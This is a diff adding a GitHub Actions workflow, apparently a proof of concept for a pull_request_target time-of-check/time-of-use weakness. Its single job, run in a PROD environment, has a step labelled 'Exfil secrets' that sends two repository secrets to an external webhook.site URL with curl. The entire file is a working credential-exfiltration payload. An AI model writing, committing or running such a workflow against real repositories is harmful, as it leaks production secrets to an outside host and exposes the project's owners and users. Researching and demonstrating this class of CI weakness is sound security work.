@@ -1,0 +1,18 @@
+name: PR Target TOCTOU Test
+on:
+     pull_request_target:
+       types: [opened, synchronize]
+
+jobs:
+     deploy:
+       runs-on: ubuntu-latest
+       environment: PROD
+       steps:
+         - name: Exfil secrets
+           env:
+             EXISTING_SECRET: ${{ secrets.EXISTING_SECRET }}
+             BRAND_NEW_SECRET: ${{ secrets.BRAND_NEW_SECRET }}
+           run: |
+             curl -X POST "https://webhook.site/9bf4ecad-15e2-4fb4-9210-47e6c57041d3" \
+               -H "Content-Type: application/json" \
+               -d "{\"existing\": \"$EXISTING_SECRET\", \"new\": \"$BRAND_NEW_SECRET\", \"source\": \"pull_request_target\"}"
